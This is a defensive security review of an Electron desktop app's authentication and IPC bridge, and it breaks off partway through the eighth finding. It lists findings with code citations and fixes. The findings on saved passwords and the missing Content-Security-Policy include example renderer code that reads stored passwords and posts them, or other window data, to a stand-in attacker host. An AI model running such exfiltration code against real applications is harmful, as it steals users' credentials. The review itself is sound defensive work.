# AppSec Review — auth + Electron IPC surface

- **Date:** 2026-05-24
- **Reviewer scope:** defensive code review only (no exploitation, no platform issues)
- **Repo:** `geode-ui`
- **Methodology:** OWASP Top 10:2025 + CIS Controls v8.1.2, evidence-first with `path:line` citations
- **Framework:** `codepros:appsec-review-framework`

---

## 1. Scope and assumptions

### Files reviewed (17, all read in full)

```text
electron/main.ts                       (577 lines)
electron/preload.ts                    ( 76 lines)
electron/lib/ipc-guards.ts             (327 lines)
electron/lib/safety.ts                 (137 lines)
electron/lib/secure-store.ts           (383 lines)
electron/lib/server-url.ts             ( 22 lines)
electron/shared/bridge-types.ts        ( 61 lines)
src/auth/AuthProvider.tsx              (502 lines)
src/auth/ProtectedRoute.tsx            ( 24 lines)
src/auth/RoleGate.tsx                  ( 36 lines)
src/auth/jwt-claims.ts                 (106 lines)
src/api/auth.ts                        (285 lines)
src/api/electron-bridge.ts             (210 lines)
src/api/profiles.ts                    (288 lines)
src/api/csrf.ts                        (130 lines)
src/api/client.ts                      (120 lines)
src/types/electron.d.ts                ( 25 lines)
```

### Supporting references consulted (read-only, not in-scope but cited for traceability)

- `src/api/connections.tsx` — `setLatestToken` / `getLatestToken` lifecycle (lines 183-308, 341-348)
- `src/App.tsx:142-213` — `RoleGate` mount site (admin route gate)
- `src/index.html` — full HTML template (no CSP meta)

### Out of scope (explicitly)

- Server-side handlers (`internal/...` of the sibling repo), including JWT signing, CSRF middleware, login rate-limit, cookie attributes (`HttpOnly`, `SameSite=Strict`)
- Go module supply chain (govulncheck owns this)
- Physical host security, kernel side-channels
- npm transitive dependency audit (a separate workflow)
- Renderer XSS surface beyond what reaches the IPC bridge (DOMPurify, monaco-editor, cytoscape rendering paths)

### Assumptions

- The server's HttpOnly + SameSite=Strict cookie + double-submit CSRF model is correct as documented in the `<auth_model>` input; this review only verifies that the SPA + Electron shell honor that contract.
- Electron's `safeStorage.encryptString(label)` produces a deterministic ciphertext for the same plaintext under the same OS-bound key entry (Keychain/DPAPI/libsecret) within a session, used as the MAC-key seed in `secure-store.ts:150`. This is an undocumented Electron implementation detail — see Finding [APP-04].
- "Saved passwords belong to the OS user" is the documented trust assumption for the Electron secure-store; cross-OS-user access requires the attacker to already control the keyring entry, which is outside the renderer threat model.
- `<repo_structure>`-documented closed gaps (S1/S3/S4/S8/S9/SEC-F7) were not re-tested; I verified the code looks consistent with the fix description as I traced.

---

## 2. Executive summary

- **No Critical or High findings.** The Electron shell follows the modern hardening template (`contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`, custom privileged scheme, single IPC surface), and the auth flow no longer puts the JWT in JS-reachable storage. Prior gap closures (S1/S3/S4/S8/S9) are traceable in the code as described.
- **Highest-risk observation is [APP-01] Saved-password IPC has no session binding** — a compromised renderer can call `geode:get-stored-password` for ANY `(profile, username)` pair without re-authentication and exfiltrate every stored credential to a server-side log via `fetch`. **Medium / High confidence.** Mitigation requires a per-session unlock or rate-limit + role check, not a code-only fix; document the trust assumption explicitly meanwhile.
- **[APP-02] Electron path ships no Content-Security-Policy.** `src/index.html` has no CSP meta tag and `electron/main.ts:206-218` sets only `Content-Type` on `geode://` responses. The privileged scheme runs with browser defaults: script can `eval`, fetch any origin, inline styles, etc. Browser-mode CSP comes from the Go server; the desktop bundle has nothing equivalent. **Medium.**
- **[APP-03] `isAllowedExternal` accepts opaque `https:` URIs** (`safety.ts:17`). The regex `/^(?:https:|mailto:)/` matches `https:evil` and `https:./path` with no authority component. `shell.openExternal` will hand these to the OS, which on some platforms may resolve them oddly (browser-dependent). **Low / Medium.**
- **[APP-04] HMAC-key derivation in `secure-store.ts:145-153` depends on undocumented determinism of `safeStorage.encryptString`.** If a future Electron version, OS keyring rotation, or DPAPI re-encryption changes the ciphertext for the same plaintext, the MAC key shifts and the entire on-disk store becomes unreadable (every read returns `{...empty}` because the HMAC verify fails). Data loss, not compromise. **Low.**
- **[APP-05] No `setPermissionRequestHandler` / `setPermissionCheckHandler`.** The privileged `geode://` scheme inherits Electron defaults for media, geolocation, notifications, etc. The current SPA doesn't request these — but a future feature or a compromised renderer can. **Low (hardening gap).**
- **[APP-06] `RoleGate` is documented as disclosure-only but mounted as the SPA admin authority** (`App.tsx:213`). The decoder is explicitly unsigned (`jwt-claims.ts:14-22`); a forged token in `sessionStorage['geode-ui.session-roles']` (private-mode bypass aside) would make `isAdmin=true` client-side without server agreement. Server-side handlers re-check (defense-in-depth), so this is information-disclosure-only as labeled — but the gap between the doc-string and the use site should be reconciled. **Low.**

Overall confidence in the auth + IPC surface: **Medium-High**. The architecture is sound; the remaining gaps are hardening + documentation, not exploit chains.

---

## 3. Findings table

| ID      | Severity | Confidence | Title                                                                     | Location                                          | OWASP                  | Status     |
|---------|----------|------------|---------------------------------------------------------------------------|---------------------------------------------------|------------------------|------------|
| APP-01  | Medium   | High       | Saved-password IPC channels have no session/origin binding                | `electron/main.ts:413-487`, `electron/preload.ts:53-71` | A01, A07          | Confirmed  |
| APP-02  | Medium   | High       | Electron path ships no Content-Security-Policy                            | `electron/main.ts:206-218`, `src/index.html:1-24` | A02, A05               | Confirmed  |
| APP-03  | Low      | High       | `isAllowedExternal` regex matches opaque `https:` and `mailto:` URIs      | `electron/lib/safety.ts:17-38`                    | A02                    | Confirmed  |
| APP-04  | Low      | Medium     | MAC-key derivation depends on undocumented `safeStorage` determinism      | `electron/lib/secure-store.ts:145-153`            | A04, A08               | Confirmed  |
| APP-05  | Low      | High       | No `setPermissionRequestHandler` on the privileged session                | `electron/main.ts:315-372`                        | A02, A06               | Confirmed  |
| APP-06  | Low      | High       | `RoleGate` doc-string says "disclosure-only" but it is mounted as the SPA admin gate | `src/auth/RoleGate.tsx:5-23`, `src/App.tsx:213` | A01 (info-disclosure)  | Confirmed  |
| APP-07  | Low      | High       | Legacy backout flag re-enables JS-readable bearer token in `localStorage` | `src/api/auth.ts:29-30, 68-79, 246-266`           | A04, A07               | Confirmed  |
| APP-08  | Low      | Medium     | `setLatestToken` module-level latch is not bound to the request connection-id | `src/api/connections.tsx:341-348`, `src/api/client.ts:71-79` | A07               | Confirmed  |
| APP-09  | Info     | High       | `geode://` protocol handler does not set `X-Content-Type-Options: nosniff` or `Cache-Control` | `electron/main.ts:206-218` | A02                  | Confirmed  |

---

## 4. Finding details

### APP-01 — Saved-password IPC channels have no session/origin binding (Medium)

#### Evidence

- `electron/preload.ts:53-71` exposes `getStoredPassword(profileName, username)`, `storeSavedPassword(profileName, username, password)`, and `clearStoredPassword(profileName, username)` on `window.geode`.
- `electron/main.ts:413-435` handler `geode:get-stored-password` validates only the string shape (length, no NUL bytes), then returns the stored plaintext via `doc.passwords?.[pwKey(profileName, username)] ?? null`.
- `electron/main.ts:128-130` `pwKey` is a pure `\x00`-joined tuple — no scoping per logged-in user, per OS user, or per active connection.
- The renderer side wrapper `src/api/electron-bridge.ts:105-116` is open to any module under the renderer origin (no further authorization).
- A renderer compromise — XSS surviving the (currently absent — see APP-02) CSP, a compromised npm transitive injected into the SPA bundle (`<threat_model>` adversary #2), or a malicious dev-tools-extension if the user opens devtools (View > Toggle Developer Tools, `main.ts:278`) — can call:

  ```js
  // attacker-controlled renderer code
  const r = await window.geode.getStoredPassword('production', 'admin')
  if (r) fetch('https://attacker.tld/x', { method: 'POST', body: r })
  ```

  with no precondition other than knowing the `(profileName, username)` pair (and operators commonly know these from the UI).

#### Why existing controls fail

- `contextIsolation: true` + `sandbox: true` prevent the renderer from reaching Node directly, but the IPC bridge is the explicit, authorized surface; a sandboxed renderer can still call every `window.geode.*` method.
- `sanitizeSavedPasswordInput` (`ipc-guards.ts:269-291`) is shape-validation only. It cannot tell who is calling.
- `safeStorage` encrypts the on-disk file under the OS user's keyring entry, which protects against another OS user reading the file directly — but not against the renderer that is already inside the OS user's process.

#### Attack scenario (non-destructive)

1. Operator signs in to a `production` profile with `savePassword=true`. `safeStorage` persists the plaintext password under key `production\x00admin`.
2. Operator later visits a page that includes a vulnerable dependency, or imports a Geode-rendered iframe that pierces CSP (currently no CSP at all in Electron — see APP-02).
3. Attacker's renderer-side code enumerates `(profile, username)` pairs visible in `getStoredConnections()` (`main.ts:384-388`) and calls `getStoredPassword` for each one.
4. Each returns the plaintext password. Attacker exfiltrates via `fetch` to an attacker-controlled origin.
5. Attacker now has DSN-targetable credentials for upstream Geode profiles — `<data_types>` "Saved passwords" + `<threat_model>` adversary class "credential abuse".

#### Impact

- Loss of all saved profile credentials in a single renderer compromise.
- Attacker can re-use credentials against upstream Geode instances directly, bypassing the geode-ui server entirely (the saved password is the upstream credential, not the JWT).
- Credential abuse is a top-trend initial access vector for 2025 — high real-world relevance.

#### Root cause

The IPC contract treats "the renderer process is sandboxed" as sufficient authorization. There is no second factor (re-prompt, OS-touch-ID gesture, per-session unlock) and no scoping to the currently active session or role. The renderer fully controls the key into the password map.

#### Remediation

Two complementary controls; **R1 is the minimum**.

**R1 — Document the trust assumption explicitly (cheap, immediate).** Update `electron/main.ts` near the saved-password handlers and `docs/ELECTRON.md` to state:

> Saved passwords in the secure-store are protected at the OS-user trust boundary only. A compromised renderer (XSS surviving CSP, compromised npm transitive, user opening devtools and pasting attacker code) can exfiltrate every stored password. Treat saved passwords as a UX convenience equivalent to a browser password manager, not as a privileged credential vault.

This converts an unstated assumption into a known accepted risk.

**R2 — Bind the lookup to the active connection (defense in depth).** Add an optional `connectionId` argument to the IPC and require that it match either:

- the current `setLatestToken`-latched session, or
- a pending login (track an "unlock" window in main process after a successful `apiLogin` for ~30 seconds).

Example diff (pseudocode, fits the existing pattern):

```ts
// electron/main.ts — geode:get-stored-password
ipcMain.handle(
  'geode:get-stored-password',
  async (_evt, profileName, username, ctx) => {
    if (!isSavedPasswordContextAllowed(ctx, profileName)) return null
    // ... existing validation ...
  },
)

// where isSavedPasswordContextAllowed checks ctx.intent === 'login-unlock'
// AND ctx.requestedAt is within an unlock window opened by main on a
// successful preceding login flow.
```

**R3 — OS-native re-authentication for "fill" (best).** Wrap `getStoredPassword` in a Touch ID / Windows Hello / `polkit` prompt via `safeStorage.isEncryptionAvailable() && systemPreferences.canPromptTouchID?.()`. Optional, gated by user preference.

#### Regression tests

- Add `electron/__tests__/ipc-guards.test.ts` cases for `sanitizeSavedPasswordInput` (already present) AND a new contract test asserting `geode:get-stored-password` requires an unlock-context once R2 lands.
- Add a manual playbook entry in `docs/ELECTRON.md`: "Open devtools, run `window.geode.getStoredPassword('any-known-profile', 'any-known-user')`; document that this currently returns the password and that R2 will change it to return null without an unlock token."

#### References / mappings

- OWASP A01 Broken Access Control (no auth check on a secret-returning channel) and A07 Authentication Failures (re-authentication missing on credential reveal).
- CWE-862 Missing Authorization.
- CIS v8.1.2 control concepts: 6 (Access Control Management), 16 (Application Software Security — specifically "use vetted security modules" — the saved-password module is custom).

---

### APP-02 — Electron path ships no Content-Security-Policy (Medium)

#### Evidence

- `src/index.html:1-24` contains no `<meta http-equiv="Content-Security-Policy" content="...">`. Verified by direct read.
- `electron/main.ts:206-218` constructs the protocol response with `headers: { 'Content-Type': contentTypeFor(...) }` only — no `Content-Security-Policy`, no `X-Frame-Options`, no `Cross-Origin-Opener-Policy`, no `Cross-Origin-Embedder-Policy`.
- `electron/main.ts` does not call `session.defaultSession.webRequest.onHeadersReceived` to inject a CSP. Confirmed by grep for `webRequest|onHeadersReceived|Content-Security-Policy`: only the existing CSP comments around `file://` and `will-navigate` (`main.ts:61`, `main.ts:351`) — no actual header injection.
- Browser path's CSP is enforced by the Go server in front of `internal/ui/dist`; the Electron path bypasses that completely because the SPA loads via the custom scheme directly from disk.

#### Why existing controls fail

- `protocol.registerSchemesAsPrivileged` with `secure: true` makes the scheme equivalent to HTTPS for cookie + service-worker policies, but does **not** apply a CSP.
- `contextIsolation` and `sandbox` protect the renderer-to-main boundary, not the renderer-to-network boundary. A compromised script in the renderer can `fetch('https://attacker.tld/...')` because no `connect-src` directive is in force.
- The existing webpack build does not inject a CSP meta tag into the emitted `index.html`.

#### Attack scenario (non-destructive)

1. Suppose an XSS-equivalent vector lands in the SPA: a malicious npm transitive that mounts a global handler, or a future feature that interpolates user-supplied markup into a DOM property.
2. Without CSP, the injected script can:
   - call `fetch('https://attacker.tld/exfil', {method:'POST', body: JSON.stringify(everything_in_window.geode)})`;
   - mount a `new WebSocket('wss://attacker.tld/...')`;
   - load arbitrary remote `<script src="...">` to escalate beyond a single payload;
   - call `window.geode.getStoredPassword(...)` (see APP-01) and pipe results out.
3. The attacker chain is identical to a normal browser XSS; the Electron shell adds the additional `window.geode.*` surface but does NOT add the browser's CSP-in-meta defense.

#### Impact

- Substantially raises the blast radius of any renderer compromise.
- Removes a defense-in-depth control that the browser-served SPA already benefits from via the Go server.
- Specifically amplifies APP-01 (no CSP → easier renderer compromise → free pass at `window.geode.getStoredPassword`).

#### Root cause

The Electron path is treated as an alternative deployment of the browser SPA, but the CSP was assumed to be a server-side concern. The custom scheme handler is the only place that can set CSP in the Electron path, and it wasn't updated when the browser-mode CSP was added on the server.

#### Remediation

Set a strict, locked CSP on every `geode://` response.

**Option A — meta tag in `index.html` (single-source).** Simpler, but `meta`-CSP cannot express `frame-ancestors` and applies after the parser starts; some directives are not honored. Acceptable here because the renderer is single-window.

```html
<!-- src/index.html, in <head>, FIRST after <meta charset> -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self' geode://app;
  script-src 'self' geode://app;
  style-src 'self' geode://app 'unsafe-inline';   <!-- styled-components needs inline -->
  font-src 'self' geode://app data:;
  img-src 'self' geode://app data: blob:;
  connect-src 'self' geode://app GEODE_SERVER_URL_PLACEHOLDER;
  worker-src 'self' geode://app blob:;            <!-- monaco workers -->
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
  form-action 'none';
" />
```

Replace `GEODE_SERVER_URL_PLACEHOLDER` at webpack-build-time from the same env var the Electron main reads, OR loosen `connect-src` to `https:` for the desktop wrapper specifically. The CSP must NOT include `'unsafe-eval'`; Monaco can be configured with worker-only eval if needed.

**Option B — header injection in the protocol handler (preferred, more directives).** Add to `electron/main.ts` around line 206:

```ts
return new Response(data, {
  status: 200,
  headers: {
    'Content-Type': contentTypeFor(resolution.filePath),
    'Content-Security-Policy': CSP_VALUE,
    'X-Content-Type-Options': 'nosniff',
    'Referrer-Policy': 'no-referrer',
  },
})
```

with `CSP_VALUE` constructed once at startup from a constant + the resolved `SERVER_URL` for `connect-src`.

Use the existing `__tests__/electron-safety.test.ts` pattern to lock-in the CSP value with a snapshot.

#### Regression tests

- Add a test in `electron/__tests__/main.test.ts` (or extend safety tests) that asserts every successful response includes a `Content-Security-Policy` header containing `default-src 'self'` and excluding `unsafe-eval`.
- Add a renderer-side smoke test that asserts `fetch('https://example.com')` is blocked under the Electron CSP.

#### References / mappings

- OWASP A02 Security Misconfiguration; A05 Injection (CSP is the primary in-depth defense against script injection).
- CWE-1021 Improper Restriction of Rendered UI Layers / Frames; CWE-79 indirectly.
- CIS v8.1.2 control concept: secure design + hardening templates.
- Electron docs (verified concept): "Define a Content-Security-Policy" — <https://www.electronjs.org/docs/latest/tutorial/security#7-define-a-content-security-policy>.

---

### APP-03 — `isAllowedExternal` regex matches opaque `https:` and `mailto:` URIs (Low)

#### Evidence

- `electron/lib/safety.ts:17` defines `EXTERNAL_URL_PATTERN = /^(?:https:|mailto:)/`.
- `electron/lib/safety.ts:28-38` `isAllowedExternal` accepts a string and applies the pattern with no further structural validation (it rejects control chars, leading whitespace, and length >2048 — but not the `//` authority).
- Strings like `https:evil-payload`, `https:./../foo`, `https:` (bare scheme), `mailto:attacker@attacker.tld?body=<long>` all match the pattern.

#### Why existing controls fail

- The regex tests the URL scheme prefix, not the URL's structural validity. RFC 3986 allows opaque URIs (no `//`); they reach `shell.openExternal` and the OS decides what to do.
- On macOS, `https:foo` is typically passed to LaunchServices and resolved against the default browser; on Windows, the shell may treat it as an opaque URI and either ignore it or route it through registered handlers. Behavior is browser/OS dependent.
- The pre-fix S1 closure (`safeOpenExternal` funnel) was specifically about blocking `file:` and custom schemes; opaque `https:` was not in the test corpus.

#### Attack scenario

1. A renderer compromise (or a crafted anchor surviving CSP — see APP-02) calls `window.geode.openExternal('https:?subject=…&body=…')`.
2. The IPC handler accepts it (`isAllowedExternal` returns true).
3. `shell.openExternal` hands the string to the OS. On a Mac, the user's default browser may interpret it as a malformed URL and display the raw string in the address bar — a phishing aid (the URL looks "https" to a hurried user) — or open a tab to `https:///?subject=...`, leaking the payload via Referer to the default homepage.
4. On Windows, `mailto:` opaque URIs with long bodies can be used for `Outlook`-prefill phishing.

Impact is bounded (no RCE, no direct credential exfil), but the whitelist is weaker than its name suggests.

#### Impact

- Low. Phishing assistance / odd OS-level behavior. No direct credential or session compromise.

#### Root cause

A regex-on-scheme-prefix is a structurally weaker check than `new URL(input)` followed by `.protocol` + `.host` validation.

#### Remediation

Replace the scheme regex with a parser-based check:

```ts
export function isAllowedExternal(input: unknown): boolean {
  if (typeof input !== 'string') return false
  if (input.length === 0 || input.length > 2048) return false
  // eslint-disable-next-line no-control-regex
  if (/[ -]/.test(input)) return false
  if (input !== input.trim()) return false
  let u: URL
  try { u = new URL(input) } catch { return false }
  if (u.protocol === 'https:') {
    // require a real authority component — rejects `https:foo`, `https:` bare,
    // and `https:./path`.
    return u.hostname.length > 0
  }
  if (u.protocol === 'mailto:') {
    // require an address-like path; URL surfaces it as `pathname`.
    return u.pathname.length > 0 && u.pathname.includes('@')
  }
  return false
}
```

Update tests in `electron/lib/__tests__/electron-safety.test.ts` to cover the new rejected cases (`https:evil`, `https:`, `mailto:noaddress`).

#### Regression tests

- Negative: `https:evil`, `https:`, `https:./path`, `mailto:`, `mailto:noaddress`, `https://`.
- Positive: `https://geodedb.com/docs/`, `mailto:user@example.com?subject=hi`.

#### References / mappings

- OWASP A02 Security Misconfiguration; CWE-20 Improper Input Validation; CWE-939 Improper Authorization in Handler for Custom URL Scheme.

---

### APP-04 — MAC-key derivation depends on undocumented `safeStorage` determinism (Low)

#### Evidence

- `electron/lib/secure-store.ts:67` declares `MAC_KEY_LABEL = 'geode-ui-mac-key-v1'`.
- `electron/lib/secure-store.ts:145-153`:

  ```ts
  function deriveMacKey(): Buffer {
    if (macKey) return macKey
    const seed = safeStorage.encryptString(MAC_KEY_LABEL)
    macKey = crypto.createHash('sha256').update(seed).digest()
    return macKey
  }
  ```

- The MAC is verified on every read (`secure-store.ts:192-214`); a mismatch returns `{...empty}` (line 213).
- Electron's public docs for `safeStorage.encryptString` describe it as "encrypts the buffer using a key bound to the user's account on the OS" and do **not** promise byte-stable output for identical inputs.

#### Why existing controls fail

- The comment in `secure-store.ts:148-149` asserts the seed is "bound to the OS keyring entry" and "two installations on the same machine each get a distinct key" — both true. But the implicit further assertion that **the same install over time** produces the same ciphertext for the same plaintext is undocumented.
- On macOS Keychain, libsecret, and DPAPI, the underlying scheme typically wraps a random AES IV/nonce per call. If the implementation uses a non-deterministic AEAD (likely on at least some platforms), `encryptString('geode-ui-mac-key-v1')` returns different bytes per call, the MAC key shifts on every restart, and HMAC verification on a previously-written file always fails.

#### Reality check

Reading the Electron source (out of band) suggests current platforms produce sufficiently stable output to make the secure-store work in practice — otherwise the existing tests + production deployments would be reporting persistent data loss. So the failure mode is latent, not active.

#### Attack scenario

This is not a confidentiality attack; it is a **data integrity / availability** concern:

1. An Electron version upgrade (or a macOS Keychain migration, a libsecret schema bump, a DPAPI rotation event) changes the wrapping scheme such that `encryptString('geode-ui-mac-key-v1')` returns a different ciphertext per call.
2. On next launch, `deriveMacKey` produces a new MAC key.
3. HMAC verify against the previously-written envelope fails (`secure-store.ts:208-214`).
4. `loadFromDisk` returns `{...empty}`.
5. The user appears to be logged out, all saved passwords are gone, all saved connections are gone. No data is destroyed on disk, but the renderer cannot read it.

#### Impact

- Low (availability + UX, not confidentiality).
- A wrapped/forgery scenario would require the attacker to produce a valid HMAC under the install-bound key, which is infeasible — this finding is about the legitimate read path silently failing.

#### Root cause

The MAC key is derived from a side effect of an opaque OS-level primitive. Stable storage of crypto material should be explicit.

#### Remediation

Two options:

**R1 — Generate and persist the MAC key explicitly.** On first run, generate 32 random bytes, encrypt them with `safeStorage.encryptString`, write the ciphertext to a sibling file (`secure-store.mackey`), and decrypt on read. The keying material lives next to the data and the OS keyring is only used to wrap the key.

```ts
async function loadOrCreateMacKey(): Promise<Buffer> {
  const keyPath = path.join(path.dirname(storePath), 'secure-store.mackey')
  try {
    const wrapped = await fs.readFile(keyPath)
    return safeStorage.decryptString(wrapped).then(b => Buffer.from(b, 'base64'))
  } catch {
    const raw = crypto.randomBytes(32)
    const wrapped = safeStorage.encryptString(raw.toString('base64'))
    await fs.writeFile(keyPath, wrapped, { mode: 0o600 })
    return raw
  }
}
```

**R2 — Verify the assumption with a regression test.** Add a test that round-trips `safeStorage.encryptString('label')` ten times and asserts each output decrypts back to the same plaintext (which is already required) AND, ideally, that two calls in the same process produce comparable byte output. This makes the assumption load-bearing and visible.

R1 is strictly safer; R2 documents the existing implicit dependency.

#### Regression tests

- After R1: add a test that confirms the MAC key file is created on first run, persisted across restarts, and that deleting it forces a re-key (a one-shot data wipe — which is preferable to a silent read failure because the user knows their data was reset).

#### References / mappings

- OWASP A04 Cryptographic Failures (key derivation); A08 Software and Data Integrity Failures (silent verify-failure → empty read).
- CWE-330 Use of Insufficiently Random Values (indirectly — relies on opaque platform behavior).
- CIS v8.1.2 concept: secure key management.

---

### APP-05 — No `setPermissionRequestHandler` / `setPermissionCheckHandler` on the privileged session (Low)

#### Evidence

- `electron/main.ts` does not call `session.defaultSession.setPermissionRequestHandler(...)` anywhere. Confirmed by grep across `electron/`.
- The privileged scheme `geode://` is declared `secure: true` (`main.ts:170-181`), which means the renderer is permitted to request privileged APIs (e.g., service workers are blocked via `allowServiceWorkers: false`, but media/clipboard-write/notifications/geolocation are not bound).

#### Why existing controls fail

- Electron's default permission handler allows most requests from a secure context. Without an explicit handler, a future feature (or compromised renderer) calling `navigator.mediaDevices.getUserMedia({ video: true })` would prompt the user; on Linux without a permission UI it can succeed silently depending on the device backend.
- The current SPA does not use these APIs, but the IPC surface is open to a future renderer that does — including a compromised one. This is a hardening gap, not an exploit chain.

#### Attack scenario

1. Renderer compromise (or a future feature) calls `navigator.clipboard.writeText('attacker-payload')` or `navigator.mediaDevices.getUserMedia(...)`.
2. With no permission handler installed, the request reaches the default behavior — which historically grants for trusted schemes.
3. Attacker reads camera/mic, or overwrites clipboard contents.

#### Impact

- Low. The current renderer does not exercise these APIs, so the practical exposure depends on a renderer compromise to even reach them.

#### Remediation

Add an explicit deny-by-default permission handler in `main.ts` immediately before `createWindow`:

```ts
import { session } from 'electron'

const ALLOWED_PERMS = new Set<string>([
  // Add specific permissions only if the SPA actually needs them.
  // The current SPA needs none.
])

app.whenReady().then(() => {
  session.defaultSession.setPermissionRequestHandler((webContents, permission, cb) => {
    cb(ALLOWED_PERMS.has(permission))
  })
  session.defaultSession.setPermissionCheckHandler((webContents, permission) =>
    ALLOWED_PERMS.has(permission),
  )
  registerProtocol()
  buildMenu()
  void createWindow()
})
```

Document the policy in `docs/ELECTRON.md`.

#### Regression tests

- Manual playbook: run the desktop app, open devtools, evaluate `navigator.permissions.query({name:'clipboard-write'})` and `navigator.mediaDevices.getUserMedia({video:true})`. Both must be denied.

#### References / mappings

- OWASP A02 Security Misconfiguration; A06 Insecure Design.
- CIS v8.1.2 concept: hardening templates.
- Electron docs: "Handle session permission requests from remote content" — <https://www.electronjs.org/docs/latest/tutorial/security#5-handle-session-permission-requests-from-remote-content>.

---

### APP-06 — `RoleGate` doc-string says "disclosure-only" but it is mounted as the SPA admin gate (Low)

#### Evidence

- `src/auth/RoleGate.tsx:5-23` doc-string: "RoleGate closes the disclosure side of the gap by short-circuiting the route render itself for users who lack the required role" and "The component DOES NOT render any '403' UI surface — the redirect is the discloure-suppressing behaviour".
- `src/auth/jwt-claims.ts:14-22` `SECURITY:` block: "This is NOT a verifier ... a client-side decode of the same token can only describe what the user CLAIMS to be, never grant any authority."
- `src/auth/AuthProvider.tsx:295-297` and `src/auth/AuthProvider.tsx:144` hydrate `roles` from `extractRoles(result.access_token)` AND from `sessionStorage['geode-ui.session-roles']` (`AuthProvider.tsx:42, 65-87`). `sessionStorage` is JS-writable.
- `src/App.tsx:213` mounts `<Route path="admin" element={<AdminPageGated />}>` where `AdminPageGated` is `<RoleGate requiredRole="admin">`.

Concretely: a renderer that has any way to write to `sessionStorage['geode-ui.session-roles']` (private-mode XSS, devtools paste, dependency XSS) BEFORE the React tree mounts can satisfy `isAdmin=true`. The roles list is loaded synchronously from sessionStorage on every mount (`AuthProvider.tsx:144`).

#### Why existing controls fail

- Server-side admin handlers re-check the role (defense-in-depth; documented at `App.tsx:206-211`). So a forged client role does NOT escalate privilege at the server.
- BUT a forged client role causes `AdminPage`, `UsersPage`, `RolesPage`, `PoliciesPage`, `GrantsPanel`, `BackupPage` (App.tsx:213-219) to render in the SPA, which:
  - Discloses the route exists and what it looks like (the doc-string says "an inline 403 surface would leak the route's existence" — but rendering the page leaks the same thing plus the form shape).
  - Fires API requests that the server will 403 — generating log noise that may aid an attacker observing rate-limit / 403 patterns.

#### Impact

- Information disclosure as documented. Confirmed not a privilege escalation because the server re-checks.
- The mis-naming (doc says "disclosure-only" but the gate IS the SPA's only client-side admin authority) is itself a documentation defect that could mislead a future maintainer into removing the server-side re-check ("the SPA already gates this").

#### Root cause

Two slightly-out-of-sync narratives: (a) "the JWT decoder is for UI hints only and any authority comes from the server" (jwt-claims.ts), (b) "RoleGate gates the admin route to suppress disclosure" (RoleGate.tsx). When the gate is the only client-side check (App.tsx:213), narrative (a) becomes load-bearing.

#### Remediation

**R1 — Reconcile the documentation.** Update `RoleGate.tsx`'s doc-string to explicitly say: "This client-side gate is information-disclosure-only. Every API handler on the server independently checks `hasRole('admin')` and returns 403. DO NOT remove the server-side check based on the presence of this gate." Cross-link from `App.tsx:206-211`.

**R2 — Make the sessionStorage roles less trivially forgeable.** Store a signed-by-server stash, OR (cheaper) call `fetchWhoAmI` on mount and use the server response to override the sessionStorage cache:

```ts
// AuthProvider.tsx — bootstrap effect (alongside the existing CSRF refresh)
useEffect(() => {
  if (!isAuthed) return
  fetchWhoAmI().then(who => {
    if (!who) return
    const serverRoles = who.roles ?? []
    writeStoredRoles(serverRoles)
    setRoles(serverRoles)
  }).catch(() => undefined)
}, [isAuthed])
```

This converts the sessionStorage stash from "authoritative until a 401" to "best-effort hint, overwritten by the next whoami response".

#### Regression tests

- Add a unit test that mounts `<AuthProvider>` with a `sessionStorage['geode-ui.session-roles']` value of `'["admin"]'` AND a `fetchWhoAmI` mock returning `roles: []` — assert that `useAuth().isAdmin === false` after the bootstrap effect runs.

#### References / mappings

- OWASP A01 Broken Access Control (information disclosure variant).
- CWE-862 Missing Authorization (in the documentation; the actual server-side authorization is in place).
- CIS v8.1.2: secure design principles.

---

### APP-07 — Legacy backout flag re-enables JS-readable bearer token in `localStorage` (Low)

#### Evidence

- `src/api/auth.ts:29-30`: `LEGACY_FLAG_KEY = 'geode-ui.legacy-auth'`, `LEGACY_TOKEN_KEY = 'geode-ui.access_token'`.
- `src/api/auth.ts:68-79`: when `isLegacyMode()` is true, `login` writes `result.access_token` to `localStorage`.
- `src/api/auth.ts:246-266`: `auth.getToken()` reads it back; `client.ts:117` passes it to the generated client; `client.ts:74-78, 99-101` keeps the `Authorization: Bearer <token>` header when the legacy token exists.
- The doc-string (auth.ts:21-26) says: "Only intended as an emergency escape hatch for an operator chasing a regression... production traffic should never use this."

#### Why existing controls fail

- A user (or an attacker who can run JS in the same origin) can set `localStorage['geode-ui.legacy-auth'] = '1'` at any time. After the user's next login, the JWT lands in JS-readable storage.
- Any DOM-XSS (or compromised npm transitive — `<threat_model>` adversary #2) can then read the JWT and exfiltrate it.

#### Attack scenario

1. A renderer compromise sets `localStorage['geode-ui.legacy-auth'] = '1'` (allowed; localStorage is writable from JS).
2. The user re-authenticates (manual login, or the next time the cookie path 401s and they re-enter credentials).
3. `auth.ts:72-78` writes the JWT to `localStorage['geode-ui.access_token']`.
4. Attacker reads `localStorage.getItem('geode-ui.access_token')` and exfiltrates.

This is exactly the DOM-XSS exfil channel SEC-F7 was meant to close. The backout flag re-opens it on demand.

#### Impact

- Low because (a) it requires a renderer compromise to flip the flag in the first place, (b) the operator-only escape-hatch documentation explicitly accepts the risk.
- But the attack does not require operator cooperation — the compromised renderer can flip the flag and wait one login cycle.

#### Remediation

Two options:

**R1 — Remove the backout flag once cookie-mode is stable.** The flag is described as an emergency escape hatch. If SEC-F7 has been in production long enough, retire it: delete `LEGACY_FLAG_KEY`, `LEGACY_TOKEN_KEY`, `isLegacyMode()`, and the conditional in `login`. The `client.ts` "strip placeholder header" path becomes unconditional.

**R2 — Keep the flag but gate it behind a build-time constant.** Replace runtime `localStorage` lookup with `process.env.GEODE_UI_ALLOW_LEGACY_AUTH === '1'` (consumed via webpack `DefinePlugin`). An operator chasing a regression rebuilds with the flag; an attacker cannot flip it from JS.

#### Regression tests

- After R1: add a test that confirms `localStorage['geode-ui.legacy-auth'] = '1'` followed by `login(...)` does NOT write to `localStorage['geode-ui.access_token']` and that `auth.getToken()` returns `null` regardless of localStorage contents.

#### References / mappings

- OWASP A04 Cryptographic Failures (storing a credential in JS-readable storage); A07 Authentication Failures (improper credential storage).
- CWE-922 Insecure Storage of Sensitive Information.
- CIS v8.1.2: secure-by-default.

---

### APP-08 — `setLatestToken` module-level latch is not bound to the request connection-id (Low)

#### Evidence

- `src/api/connections.tsx:341-348`: `latestActiveToken` is a single module-level `string | null`.
